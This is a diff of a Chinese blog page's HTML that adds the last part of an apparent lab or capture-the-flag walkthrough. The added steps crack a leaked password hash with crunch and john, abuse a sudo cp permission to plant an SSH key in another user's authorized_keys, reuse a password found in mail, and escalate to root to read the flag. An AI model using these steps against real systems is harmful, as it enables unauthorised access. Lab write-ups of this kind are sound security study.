@@ -45,8 +45,18 @@
 <meta property="og:image" content="https://i.loli.net/2021/05/14/HuPBYdxZX9LylKs.png">
 <meta property="og:image" content="https://i.loli.net/2021/05/14/IFRLAYWqaoGtS8v.png">
 <meta property="og:image" content="https://i.loli.net/2021/05/14/vHzlJdCqMFou97O.jpg">
+<meta property="og:image" content="https://i.loli.net/2021/05/14/Qy6oFRhgStKIm3x.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/14/UxMPp2Eg9VF6rBL.jpg">
+<meta property="og:image" content="https://i.loli.net/2021/05/14/drFCt83HUP5DegE.jpg">
+<meta property="og:image" content="https://i.loli.net/2021/05/14/6FVjiADQZuWY8Id.jpg">
+<meta property="og:image" content="https://i.loli.net/2021/05/14/dbGzqjw1trkXy3s.jpg">
+<meta property="og:image" content="https://i.loli.net/2021/05/14/9wqnAT3EsrU5e4t.jpg">
+<meta property="og:image" content="https://i.loli.net/2021/05/14/rda38HnP6S5pfij.jpg">
+<meta property="og:image" content="https://i.loli.net/2021/05/14/LwxjPEQHvTBUK68.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/14/e4d3WR8wcLba9XV.jpg">
+<meta property="og:image" content="https://i.loli.net/2021/05/14/2xlvmORPjBCTIt8.jpg">
 <meta property="article:published_time" content="2021-05-10T14:20:36.000Z">
-<meta property="article:modified_time" content="2021-05-14T02:11:21.672Z">
+<meta property="article:modified_time" content="2021-05-14T08:44:30.035Z">
 <meta property="article:author" content="Du1">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary">
@@ -404,6 +414,30 @@
 <p><code>cp /usr/share/exploitdb/exploits/php/webapps/47772.rb /usr/share/metasploit-framework/modules/exploits</code></p>
 <p><img src="https://i.loli.net/2021/05/14/IFRLAYWqaoGtS8v.png" alt="2VVE3EMW08WLWS__PGPW_Z9.png"></p>
 <p><img src="https://i.loli.net/2021/05/14/vHzlJdCqMFou97O.jpg"></p>
+<p>在家目录里面发现提示：</p>
+<p><img src="https://i.loli.net/2021/05/14/Qy6oFRhgStKIm3x.png"></p>
+<p>douglas 用户的密码由 aefhrt 构成十位，可以爆破：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crunch 10 10 aefhrt &gt; passwd</span><br><span class="line">echo &#39;douglas:$apr1$9fgG&#x2F;hiM$BtsL9qpNHUlylaLxk81qY1&#39; &gt; 1.txt</span><br><span class="line">john --wordlist&#x3D;passwd 1.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/05/14/UxMPp2Eg9VF6rBL.jpg"></p>
+<p>要爆很久，爆出来密码为：fatherrrrr，登录一波：</p>
+<p><img src="https://i.loli.net/2021/05/14/drFCt83HUP5DegE.jpg"></p>
+<p>sudo -l 发现可以以 jen 的身份执行 cp 命令：</p>
+<p><img src="https://i.loli.net/2021/05/14/6FVjiADQZuWY8Id.jpg"></p>
+<p>所以我们可以写入 jen 的 authorized_keys 来包含 douglas 的公钥，从而直接用 douglas 的 id_rsa 免密 ssh 登录 jen，因为 jen 没有权限访问 douglas，而 douglas 也亦然，所以先丢到 /tmp，再转。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp ~/.ssh/id_rsa.pub /tmp/authorized_keys</span><br><span class="line">chmod 777 /tmp/authorized_keys</span><br><span class="line">sudo -u jen /bin/cp /tmp/authorized_keys /home/jen/.ssh/</span><br><span class="line">ssh -i id_rsa jen@127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/05/14/dbGzqjw1trkXy3s.jpg"></p>
+<p>还可以发现一个 mail，看一下：</p>
+<p><img src="https://i.loli.net/2021/05/14/9wqnAT3EsrU5e4t.jpg"></p>
+<p>获取到了 moss 用户的密码，登上：</p>
+<p><img src="https://i.loli.net/2021/05/14/rda38HnP6S5pfij.jpg"></p>
+<p>家目录里面发现 .games/ 里面有提升权限的文件，直接执行：</p>
+<p><img src="https://i.loli.net/2021/05/14/LwxjPEQHvTBUK68.png"></p>
+<p>获得 root 权限：</p>
+<p><img src="https://i.loli.net/2021/05/14/e4d3WR8wcLba9XV.jpg"></p>
+<p>root 里面轻取 flag：</p>
+<p><img src="https://i.loli.net/2021/05/14/2xlvmORPjBCTIt8.jpg"></p>
 
   </div>
 </article>
